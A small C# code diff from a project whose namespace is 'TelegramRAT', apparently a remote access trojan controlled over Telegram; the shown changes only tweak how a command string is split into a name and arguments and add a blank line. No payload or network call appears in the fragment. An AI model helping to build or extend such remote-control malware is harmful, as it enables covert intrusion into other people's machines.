@@ -34,7 +34,7 @@ namespace TelegramRAT
             }
 
             var splits = text.Split(' ');
-            var name = splits?.FirstOrDefault().ToLower();
+            var name = splits.FirstOrDefault().ToLower();
             var args = splits.Skip(1).Take(splits.Count()).ToArray();
             List<string> finished = new List<string>();
 
@@ -74,6 +74,7 @@ namespace TelegramRAT
                             sb.Clear();
                         }
                         break;
+
                     default:
                         sb.Append(fullargs[i]);
                         break;
